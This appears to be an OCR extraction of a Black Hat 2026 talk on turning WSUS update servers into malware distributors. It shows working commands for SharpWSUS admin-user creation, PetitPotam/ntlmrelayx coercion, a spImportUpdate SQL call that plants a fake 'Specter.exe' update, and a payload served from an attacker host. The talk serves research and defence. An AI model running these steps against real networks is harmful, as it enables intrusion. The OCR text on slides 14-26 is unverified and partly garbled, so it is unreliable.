---
title: "Turning Enterprise Update Servers Into Backdoor Factories (0_o)"
speakers: ["bagelByt3s"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf"
pages: 77
sha256: "3371c0035cd4317ee589b5665b6a1b38ea55aba34e86906e5d3ecff2929219b7"
text_chars: 52399
ocr_pages: 57
has_ocr: true
redacted_secrets: 0
ocr_confidence: 90.0
ocr_unreliable_blocks: 4
content_note: "64 of 77 pages were rendered and read against the source PDF by a vision model; 60 were rewritten. PAGES 14-26 WERE NOT REVIEWED: two attempts were stopped by the model API's cyber safeguards, which trigger on this deck's subject rather than on any individual page. Those pages remain first-pass extraction and are not verified."
vision_verified_pages_changed: 60
vision_verified_pages: 64
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:50:17Z"
---
# Turning Enterprise Update Servers Into Backdoor Factories (0_o)

**Speakers:** bagelByt3s  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/bagelByt3s_Turning Enterprise Update Servers Into Backdoor Factories (0_o).pdf` (77 pages)


## Slide 1

### Turning Enterprise Update Servers Into Backdoor Factories (0_o)

Beyviel David

Adversary Simulation Consultant

## Slide 2

### Whoami

- Adversary Simulation Consultant
- I love to eat
- I go by “Bagel”
- I like to push limits

2

## Slide 3

### How Attackers Win

- Domain Controller
- Endpoint Management Infrastructure (shield labeled **SCCM**)
- Privileged Fileshare
- Certificate Management Infrastructure (shield labeled **ADCS**)

3

## Slide 4

### Introduction

**unsigned_sh0rt** — Nov 15th, 2024 at 3:23 AM

we, at the very least, have control over the wsus database (edited)

4 replies

**unsigned_sh0rt** — Nov 15th, 2024 at 3:28 AM

I dont know enough about wsus or have the time to lab things out to take advantage of it

I believe we could do things like create and approve malicious updates or modify update metadata

4

## Slide 5

### Que es WSUS?

Top navigation: Windows Server | Get started | Learn Windows Server | Troubleshooting | Previous versions documentation | Resources

Left navigation (Find by title):

- Management
- Overview
- Azure Arc enabled server
- Windows Server Azure Arc Management
- Windows Admin Center
- System Center
- Built-in management tools
  - What is the Server Core installation option?
  - Manage on-premises systems with Server Manager
  - Install Remote Server Administration Tools
  - Manage Windows with OpenSSH
  - Windows Server Update Services (WSUS)
    - **Windows Server Update Services (WSUS)**
    - Deploy Windows Server Update Services
    - Update Management with Windows Server Update Services
    - Express update delivery ISV support
    - Migrating the WSUS database from Windows Internal Database (WID) to SQL
  - Windows Console behavior in Windows Server
  - Collect information about your environment and systems

Breadcrumb: Learn / Windows Server / Administration /  — Ask Learn — Focus mode

### Windows Server Update Services (WSUS) overview

Applies to: Windows Server 2025, Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows 11, Windows 10

Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network. This article provides an overview of this server role and more information about how to deploy and maintain WSUS.

> **Note**
> WSUS is deprecated and is no longer adding new features. However, it continues to be supported for production deployments, and receives security and quality updates as per the product lifecycle. For more info, see **Features removed or no longer developed in Windows Server**.

### WSUS Server role description

A WSUS server provides features that you can use to manage and distribute updates through a management console. A WSUS server can also be the update source for other WSUS servers within the organization. The WSUS server that acts as an update source is called an upstream server. In a WSUS implementation, at least one WSUS server on your network must be able to connect to Microsoft Update to get available update information. As an administrator, you can

5

## Slide 6

### Que es WSUS?

Learn / Windows Server / Administration /  — Ask Learn — Focus mode

### Windows Server Update Services (WSUS) overview

Applies to: Windows Server 2025, Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows 11, Windows 10

Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network. This article provides an overview of this server role and more information about how to deploy and maintain WSUS.

> **Note**
> WSUS is deprecated and is no longer adding new features. However, it continues to be supported for production deployments, and receives security and quality updates as per the product lifecycle. For more info, see **Features removed or no longer developed in Windows Server**.

6

## Slide 7

### Que es WSUS?

### Windows Server Update Services (WSUS) overview

Windows Server Update Services (WSUS) provides a way for IT administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network. This article provides an overview of this server role and more information about how to deploy and maintain WSUS.

7

## Slide 8

- **WSUS Client**
- Configured via Registry or GPO
- Initiates Update to WSUS Server

8

## Slide 9

- **WSUS Server**
- Downloads Updates from Microsoft
- Approves and deploys updates to client
- Can be configured with to be upstream/downstream

9

## Slide 10

- **WSUS Database**
- Stores Update Metadata
- Windows Internal Database (WID)
- External SQL Server

10

## Slide 11

11

## Slide 12

12

## Slide 13

Upstream

Downstream

13

## Slide 14

Client

Client

Upstream

Downstream

14


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Client Upstream
Client Downstream
14
```

## Slide 15

Client

Upstream

Database

Client

Downstream

Database

15

## Slide 16

Client

Upstream

Database

Client

Downstream

Database

16


> Recovered by OCR — confidence 96/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Client Upstream
Client Downstream
Database
Database
16
```

## Slide 17

# SharpWSUS

17


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS
I.) \v v/s __) |
Phil Keeble @ Nettitude Red Team
Commands listed below have optional parameters in <>.
Locate the WSUS server:
SharpWSUS.exe locate
Inspect the WSUS server, enumerating clients, servers and existing groups
SharpWSUS.exe inspect
Create an update (NOTE: The payload has to be a windows signed binary):
SharpWSUS.exe create /payload:[File location] /args:[Args for payload] </title:[Update title] /date
Approve an update:
SharpWSUS.exe approve /updateid:[UpdateGUID] /computername:[Computer to target] </groupnam
Check status of an update:
SharpWSUS.exe check /updateid:[UpdateGUID] /computername: [Target FQDN]
Delete update and clean up groups added:
SharpWSUS.exe delete /updateid:[UpdateGUID] /computername:[Target FQDN] </groupname:[GroupName] /ke
```

## Slide 18

# SharpWSUS

18


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS
Lateral Movement
A key consideration with WSUS lateral movement is that there is no way to control when a client checks
in from the server. This means that once a patch is deployed the lateral movement won’t succeed until
the client installs the update. Often times the client will check in for patches on a regular cycle, for
example daily, but the patches won’t be installed until a patching day that might happen once a month.
Some clients may be configured to install patches immediately if their priority level is high enough.
The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When
creating the patch there are various values that can be configured through the command line in
SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
also a value for the payload and arguments. The payload must be a Microsoft signed binary and must
point to a location on disk for the WSUS server to that binary.
While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
will use PsExec.exe for code execution (https://docs.microsoft.com/en-
us/sysinternals/downloads/psexec).
A patch leveraging PsExec.exe can be done with the following command:
SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-
accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
localgroup administrators WSUSDemo /add\"" /title: "WSUSDemo"
18
```

## Slide 19

19


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SharpWSUS, allowing the operator to change the Indicators of Compromise (loCs) of the patch. There is
also a value for the payload and arguments, The payload must be a Microsoft signed binary and must
point to a location on disk for the WSUS server to that binary.
While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could
be used such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL ona
network share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog
will use PsExec.exe for code execution (https://docs.microsoft.com/en-
us/sysinternals/downloads/psexec).
A patch leveraging PsExec.exe can be done with the following command:
SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:'-
accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net
```

## Slide 20

# Exploitation Difficulty

- WSUS Administrator

- WSUS File System Access

- Digitally Signature

Paella = Lots of Effort R equired

20

## Slide 21

Does the upstream WSUS server have administrative permissions over the downstream WSUS server?

21


> Recovered by OCR — confidence 96/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Does the upstream WSUS server have
administrative permissions over the
downstream WSUS server?
21
```

## Slide 22

# NTLM Coercion Testing SMB to SMB

Upstream

Downstream

Attacker

22


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
Ee |
Upstream Downstream
Attacker
22
```

## Slide 23

# NTLM Coercion Testing SMB to SMB

### 1. Setup Ntlmrelay on Attack Machine

2. Coerce Authentication to Upstream 3. R elay authentication to Downstream

Upstream

Downstream

SMB Session as Upstream server

Attacker

23

## Slide 24

NTLM Coercion Testing SMB to SMB

Downstream WSUS Server

24


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
(env) root@ludus3:~# ntlmrelayx.py -t|smb://10.2.10.U] -socks -smb2support
Impacket v@.13.0 - Copyright Fortra, LLC and vee companies
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded. .
[*] Protocol Client LDAP loaded..
[*] Protocol Client WINRMS Loaded. .
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded. .
[*] Protocol Client RPC loaded. .
[*] Protocol Client DCSYNC loaded. .
Downstream WSUS Server
```

## Slide 25

# NTLM Coercion Testing SMB to SMB

Attacker IP /
Ntlmrelayx
Upstream WSUS
Server

25


> Recovered by OCR — confidence 91/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
(env) root@Ludus3:/opt/PetitPotam# python3 PetitPotam.py -u domainuser -p password -d Ludus.nuketown 198.51.100.1 10.2.10.3
- rl Attacker IP /
Upstream WSUS
PoC to elicit machine account authentication via some MS-EFSRPC functions
by topotam (@topotam77)
Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
Trying pipe lsarpc
[-] Connecting to ncacn_np:10.2.10.3[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00cO4Fd90F7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception! !
[+] Attack worked!
```

## Slide 26

NTLM Coercion Testing SMB to SMB

26


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NTLM Coercion Testing
SMB to SMB
ntlmrelayx> [*] (SMB): Received connection from 10.2.10.3, attacking target smb://10.2.10.u
[*] (SMB): Authenticating connection from LUDUS/WSUS1$@10.2.10.3 against smb://10.2.10.4 SUCCEED [1]
[*] SOCKS: Adding SMB: //LUDUS/WSUS1$@10.2.10.4(44U5) [1] to active SOCKS connection. Enjoy
[*] ALL targets processed!
[*] (SMB): Connection from 10.2.10.3 controlled, but there are no more targets left!
socks
Protocol Target Username AdminStatus} Port ID
SMB 10.2.10.4 LUDUS/WSUS1$ |_FALSE 4u5 1
26
```

## Slide 27

**Does the upstream WSUS server have SQL access to the WSUS database?**

27

## Slide 28

### NTLM Coercion Testing

**SMB to SMB**

*Diagram with three labeled icons:*

- Upstream
- Database
- Attacker

28

## Slide 29

### NTLM Coercion Testing

**SMB to SMB**

*Diagram with three labeled icons:*

- Upstream
- Database
- Attacker

29

## Slide 30

### NTLM Coercion Testing

**SMB to SMB**

1. Setup Ntlmrelay on Attack Machine
2. Coerce Authentication to Upstream
3. Relay authentication to Database

*Diagram with labeled icons: Upstream, Database, Attacker. A double-headed arrow between Attacker and Database is labeled "SQL Session as upstream server".*

30

## Slide 31

### NTLM Coercion Testing

**SMB to MSSQL**

```text
[*] (SMB): Received connection from 10.2.10.3, attacking target mssql://10.2.10.2
[*] Encryption required, switching to TLS
[*] (SMB): Authenticating connection from LUDUS/WSUS1$@10.2.10.3 against mssql://10.2.10.2 SUCCEED [1]
[*] SOCKS: Adding MSSQL://LUDUS/WSUS1$@10.2.10.2(1433) [1] to active SOCKS connection. Enjoy
[*] All targets processed!
[*] (SMB): Connection from 10.2.10.3 controlled, but there are no more targets left!
socks
Protocol  Target      Username      AdminStatus  Port  ID
--------  ---------   -------------  -----------  ----  ---
MSSQL     10.2.10.2   LUDUS/WSUS1$   N/A          1433  1
```

31

## Slide 32

### Exploitation Difficulty

- WSUS Administrator
- WSUS File System Access
- Digitally Signature

*Photo of a basket of fried chicken.*

32

## Slide 33

### NTLM Coercion Testing

**SMB to MSSQL**

```text
SQL (LUDUS\WSUS1$  guest@master)> SELECT name from sys.databases;
name
------
master

tempdb

model

msdb

SUSDB
```

33

## Slide 34

### Blocker: Limited SQL Permissions

```text
SQL (LUDUS\WSUS1$  LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbAuthorization
ERROR(SQL1-WSUS): Line 1: The SELECT permission was denied on the object 'tbAuthorization', da
SQL (LUDUS\WSUS1$  LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbCategory
ERROR(SQL1-WSUS): Line 1: The SELECT permission was denied on the object 'tbCategory', databas
SQL (LUDUS\WSUS1$  LUDUS\WSUS1$@SUSDB)> SELECT TOP 1 * FROM susdb.dbo.tbFile
ERROR(SQL1-WSUS): Line 1: The SELECT permission was denied on the object 'tbFile', database 'S
```

*Photo of a masked figure in a suit holding a laptop, captioned:*

Chris Thompson
Mayyhem

34

## Slide 35

### Blocker: Limited SQL Permissions

*BloodHound-style graph. Nodes:*

- LUDUS\WSUS1$
- PUBLIC@SUSDB
- WEBSERVICE@SUSDB
- LUDUS\WSUS1$@SUSDB
- SUSDB

*Edge labels:* MSSQL_IsMappedTo, MSSQL_MemberOf, MSSQL_MemberOf, MSSQL_Contains, MSSQL_Connect

35

## Slide 36

### Blocker: Limited SQL Permissions

*SSMS query results (Results / Messages tabs):*

| # | ComputerAccount | RoleName | Permission | ObjectName |
|---|---|---|---|---|
| 1 | LUDUS\WSUS1$ | webService | EXECUTE | spGetFrontEndServerInfo |
| 2 | LUDUS\WSUS1$ | webService | EXECUTE | spAcceptEula |
| 3 | LUDUS\WSUS1$ | webService | EXECUTE | spSetFrontEndServerInfo |
| 4 | LUDUS\WSUS1$ | webService | EXECUTE | spAcceptEulaForReplicaDSS |
| 5 | LUDUS\WSUS1$ | webService | EXECUTE | spSetFileLocationChange |
| 6 | LUDUS\WSUS1$ | webService | EXECUTE | spGetRevisionInfo |
| 7 | LUDUS\WSUS1$ | webService | EXECUTE | spGetDeltaRevisionInfo |
| 8 | LUDUS\WSUS1$ | webService | EXECUTE | spNotifyContentSyncNotificationEventWorking |
| 9 | LUDUS\WSUS1$ | webService | EXECUTE | spGetConfigurationValue |
| 10 | LUDUS\WSUS1$ | webService | EXECUTE | spGetNextContentSyncWorkItem |
| 11 | LUDUS\WSUS1$ | webService | EXECUTE | spGetInstallableItems |
| 12 | LUDUS\WSUS1$ | webService | EXECUTE | spSetConfigurationValue |
| 13 | LUDUS\WSUS1$ | webService | EXECUTE | spGetNextContentSyncWorkItemOnStartup |
| 14 | LUDUS\WSUS1$ | webService | EXECUTE | spGetApprovedUpdateMetadata |
| 15 | LUDUS\WSUS1$ | webService | EXECUTE | spUpdateFileDownloadProgress |
| 16 | LUDUS\WSUS1$ | webService | EXECUTE | spHasApprovalsChanged |
| 17 | LUDUS\WSUS1$ | webService | EXECUTE | spDownloadFiles |
| 18 | LUDUS\WSUS1$ | webService | EXECUTE | spGetUpdateByID |
| 19 | LUDUS\WSUS1$ | webService | EXECUTE | spSetFileMUUrl |
| 20 | LUDUS\WSUS1$ | webService | EXECUTE | spGetUpdatesBundledByUpdate |
| 21 | LUDUS\WSUS1$ | webService | EXECUTE | spGetUpdatesForFile |

- Only EXECUTE Permissions on Stored Procedures
- No SELECT/UPDATE/DELETE permissions on any WSUS tables

36

## Slide 37

**The webService role is limited to specific stored procedures**

37

## Slide 38

### Running Stored Procedures

**Applies to:** ✅ SQL Server ✅ Azure SQL Database ✅ Azure SQL Managed Instance ✅ Azure Synapse Analytics ✅ Analytics Platform System (PDW)

A stored procedure is an executable object stored in a database. SQL Server supports:

- Stored procedures:

  One or more SQL statements precompiled into a single executable procedure.

- Extended stored procedures:

  C or C++ dynamic-link libraries (DLL) written to the SQL Server Open Data Services API for extended stored procedures. The Open Data Services API extends the capabilities of

38

## Slide 39

### Running Stored Procedures

*Blurred documentation screenshot; one line is in focus:*

One or more SQL statements precompiled into a single executable procedure.

39

## Slide 40

# Stored Procedures

WSUS Server

Database

40

## Slide 41

# Stored Procedures

spImportUpdate

WSUS Server

Database

41

## Slide 42

# spImportUpdate

Imports new update into the WSUS database

42

## Slide 43

# spImportUpdate

Imports new update into the WSUS database

```text
SQL (LUDUS\WSUS1$  LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevisionID
int exec spImportUpdate @UpdateXml=N'<upd:Update xmlns:b="http://schemas.microsoft.com/ms
us/2002/12/LogicalApplicabilityRules" xmlns:pub="http://schemas.microsoft.com/msus/2002/1
2/Publishing" xmlns:cbs="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" xm
lns:cbsar="http://schemas.microsoft.com/msus/2002/12/CbsApplicabilityRules" xmlns:upd="ht
tp://schemas.microsoft.com/msus/2002/12/Update"><upd:UpdateIdentity UpdateID="a7751c4d-ea
b5-45ef-8cd7-2fae2fea1252" RevisionNumber="1" /><upd:Properties DefaultPropertiesLanguage
="en" UpdateType="Software" ExplicitlyDeployable="true" Handler="http://schemas.microsof
t.com/msus/2002/12/UpdateHandlers/Cbs" MaxDownloadSize="2095616" MinDownloadSize="209561
6" PublicationState="Published" CreationDate="2025-08-31T00:03:55.912Z" PublisherID="3953
92a0-19c0-48b7-a927-f7c15066d905"><upd:InstallationBehavior RebootBehavior="CanRequestReb
oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
upd:LocalizedPropertiesCollection><upd:LocalizedProperties><upd:Language>en</upd:Language
><upd:Title>Specter</upd:Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/lSqnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
YV5qPqWZW+HbqEjH1LZEwA2Ilbh/lhNpo=</upd:AdditionalDigest></upd:File></upd:Files><upd:Hand
lerSpecificData xsi:type="cmd: CommandLineInstallation" xmlns:xsi="http://www.w3.org/200
1/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing"><c
md:InstallCommand Arguments="" Program="Specter.exe" RebootByDefault="false" DefaultResul
t="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Command
LineInstallation"><cmd:ReturnCode Reboot="false" Result="Succeeded" Code="0" /></cmd:Inst
allCommand></upd:HandlerSpecificData></upd:Update>',@UpstreamServerLocalID=1,@Imported=@i
Imported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL; sele
ct @iImported,@iLocalRevisionID
INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
y added into the database
```

43

## Slide 44

```text
SQL (LUDUS\WSUS1$  LUDUS\WSUS1$@SUSDB)> declare @iImported int declare @iLocalRevisionID
int exec spImportUpdate @UpdateXml=N'<upd:Update xmlns:b="http://schemas.microsoft.com/ms
us/2002/12/LogicalApplicabilityRules" xmlns:pub="http://schemas.microsoft.com/msus/2002/1
2/Publishing" xmlns:cbs="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" xm
lns:cbsar="http://schemas.microsoft.com/msus/2002/12/CbsApplicabilityRules" xmlns:upd="ht
tp://schemas.microsoft.com/msus/2002/12/Update"><upd:UpdateIdentity UpdateID="a7751c4d-ea
b5-45ef-8cd7-2fae2fea1252" RevisionNumber="1" /><upd:Properties DefaultPropertiesLanguage
="en" UpdateType="Software" ExplicitlyDeployable="true" Handler="http://schemas.microsof
t.com/msus/2002/12/UpdateHandlers/Cbs" MaxDownloadSize="2095616" MinDownloadSize="209561
6" PublicationState="Published" CreationDate="2025-08-31T00:03:55.912Z" PublisherID="3953
92a0-19c0-48b7-a927-f7c15066d905"><upd:InstallationBehavior RebootBehavior="CanRequestReb
oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
upd:LocalizedPropertiesCollection><upd:LocalizedProperties><upd:Language>en</upd:Language
><upd:Title>Specter</upd:Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/lSqnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
```

44

## Slide 45

*The same blurred spImportUpdate terminal output, with the update’s UpdateID highlighted; the surrounding text is out of focus [illegible]:*

```text
tp://schemas.microsoft.com/msus/2002/12/Update"><upd:UpdateIdentity UpdateID="a7751c4d-ea
b5-45ef-8cd7-2fae2fea1252" RevisionNumber="1" /><upd:Properties DefaultPropertiesLanguage
```

45

## Slide 46

```text
oot" /><upd:UninstallationBehavior RebootBehavior="CanRequestReboot" /></upd:Properties><
upd:LocalizedPropertiesCollection><upd:LocalizedProperties><upd:Language>en</upd:Language
><upd:Title>Specter</upd:Title></upd:LocalizedProperties></upd:LocalizedPropertiesCollect
ion><upd:ApplicabilityRules><upd:IsInstalled><b:False /></upd:IsInstalled><upd:IsInstalla
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/lSqnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
6" Modified="2025-08-31T15:26:20.723"><upd:AdditionalDigest Algorithm="SHA256">g1M2EFXHDs
YV5qPqWZW+HbqEjH1LZEwA2Ilbh/lhNpo=</upd:AdditionalDigest></upd:File></upd:Files><upd:Hand
lerSpecificData xsi:type="cmd: CommandLineInstallation" xmlns:xsi="http://www.w3.org/200
1/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing"><c
md:InstallCommand Arguments="" Program="Specter.exe" RebootByDefault="false" DefaultResul
t="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Command
LineInstallation"><cmd:ReturnCode Reboot="false" Result="Succeeded" Code="0" /></cmd:Inst
allCommand></upd:HandlerSpecificData></upd:Update>',@UpstreamServerLocalID=1,@Imported=@i
Imported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL; sele
ct @iImported,@iLocalRevisionID
INFO(SQL1-WSUS): Line 1792: Update A7751C4D-EAB5-45EF-8CD7-2FAE2FEA1252\1 is successfull
y added into the database
```

46

## Slide 47

*The same blurred terminal output, with the update’s Title, file Digest, FileName and InstallCommand arguments highlighted; the surrounding text is out of focus [illegible]:*

```text
...<upd:Title>Specter</upd:Title>...
ble><b:True /></upd:IsInstallable></upd:ApplicabilityRules><upd:Files><upd:File Digest="y
2/wvtpOW/lSqnhTjJoi3xE1EGM=" DigestAlgorithm="SHA1" FileName="Specter.exe" Size="209561
...InstallCommand Arguments="" Program="Specter.exe"...
```

47

## Slide 48

# Stored Procedures

```text
spImportUpdate
    spSaveXmlFragment
    spSaveXmlFragment
    spSaveXmlFragment
spImportUpdate
    spSaveXmlFragment
    spSaveXmlFragment
    spSaveXmlFragment
spSetBatchURL
spGetAllTargetGroups
spCreateTargetGroup
spGetComputerTargetByName
spDeployUpdate
```

Create Parent Update

Create Child Update

WSUS Server

Database

Target Computer

48

## Slide 49

# Blocker: Trouble Downloading

```text
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.2.10.3 - - [20/Dec/2025 15:08:09] "HEAD /Specter.exe HTTP/1.1" 200 -
10.2.10.3 - - [20/Dec/2025 15:08:09] "GET /Specter.exe HTTP/1.1" 200 -
----------------------------------------
Exception occurred during processing of request from ('10.2.10.3', 51944)
Traceback (most recent call last):
  File "/usr/lib/python3.11/socketserver.py", line 691, in process_request_thread
    self.finish_request(request, client_address)
```

49

## Slide 50

# Blocker: Trouble Downloading

Specter

The files for this update failed to download. The update can be approved but will not be available to computers until the download is complete. Click Retry Download to start the download again.

Status:

Computers with errors: 0

Computers needing this update: 0

Computers installed/not applicable: 0

Computers with no status: 3

MSRC severity: Critical

MSRC number:

Release date: Saturday, August 30, 2025

KB article numbers: 5006103

50

## Slide 51

# Blocker: Trouble Downloading

*A SoftwareDistribution log open in Notepad overlaps the Specter WSUS console from the previous slide.*

SoftwareDistribution - Notepad

File  Edit  Format  View  Help

```text
NotificationEventName: ContentSyncAgent, EventInfo:
2025-12-20 20:08:13.949 UTC       Info      WsusService.49   ThreadEntry       ThreadHelper.ThreadStart
2025-12-20 20:08:13.949 UTC       Info      WsusService.49   SusEventDispatcher.DispatchManagerWorkerThreadProc
DispatchManager Worker Thread Processing NotificationEvent: ContentSyncAgent
2025-12-20 20:08:13.949 UTC       Info      WsusService.50   ThreadEntry       ThreadHelper.ThreadStart
2025-12-20 20:08:13.949 UTC       Info      WsusService.50   SusEventDispatcher.RegisterEventHandler RegisterEventHandler called
for NotificationEventName: ConfigurationChange
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   EventLogEventReporter.ReportEvent
EventId=361,Type=Information,Category=Synchronization,Message=Content synchronization started.
2025-12-20 20:08:13.949 UTC       Info      WsusService.8    SusEventDispatcher.TriggerEvent TriggerEvent called for
NotificationEventName: DeploymentChange, EventInfo: DeploymentChange
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc ServerHealth: Updating Server
Health for Component: ContentSyncAgent Running, Marking as Running
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc Processing Item: e1e609f1-
436e-4fba-a9d0-3291eb717ecd, State: 10
2025-12-20 20:08:14.073 UTC       Info      WsusService.50   ContentSyncAgent.Download       Item: e1e609f1-436e-4fba-a9d0-
3291eb717ecd has been submitted to BITS for Download
2025-12-20 20:08:14.073 UTC       Info      WsusService.50   ContentSyncAgent.WakeUpWorkerThreadProc ContentSyncAgent found no more
Jobs, going to Sleep for BITS Notifications
2025-12-20 20:08:34.090 UTC       Info      WsusService.52   ThreadEntry       ThreadHelper.ThreadStart
2025-12-20 20:08:34.090 UTC       Error     WsusService.52   ContentSyncAgent.JobError       Download error:
http://198.51.100.1:8000/Specter.exe failed in download: (-2145386477) The server does not support the necessary HTTP
protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.

   at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.JobError(IBitsJob job, BitsJobError joberror, String
fileRemoteName)
   at Microsoft.UpdateServices.ServerSync.ContentSyncAgent.MonitorStatusThreadProc()
   at System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state,
Boolean preserveSyncCtx)
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state, Boolean
preserveSyncCtx)
   at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
   at System.Threading.ThreadHelper.ThreadStart()
2025-12-20 20:08:34.090 UTC       Warning WsusService.50    ContentSyncAgent.ProcessBITSNotificationQueue    ContentSyncAgent
recieved Failure for Item: e1e609f1-436e-4fba-a9d0-3291eb717ecd, Item fails
2025-12-20 20:08:34.090 UTC       Info      WsusService.50   ContentSyncAgent.ContentSyncSPFireStateMachineEvent
ContentSyncAgent firing Event: FileDownloadFailed for Item: e1e609f1-436e-4fba-a9d0-3291eb717ecd
2025-12-20 20:08:34.090 UTC       Info      WsusService.50   EventLogEventReporter.ReportEvent
```

51

## Slide 52

```text
2025-12-20 20:08:13.949 UTC       Info      WsusService.49   SusEventDispatcher.DispatchManagerWorkerThreadProc
DispatchManager Worker Thread Processing NotificationEvent: ContentSyncAgent
2025-12-20 20:08:13.949 UTC       Info      WsusService.50   ThreadEntry       ThreadHelper.ThreadStart
2025-12-20 20:08:13.949 UTC       Info      WsusService.50   SusEventDispatcher.RegisterEventHandler RegisterEventHandler called
for NotificationEventName: ConfigurationChange
2025-12-20 20:08:13.964 UTC       Info      WsusService.50   EventLogEventReporter.ReportEvent
EventId=361,Type=Information,Category=Synchronization,Message=Content synchronization started.
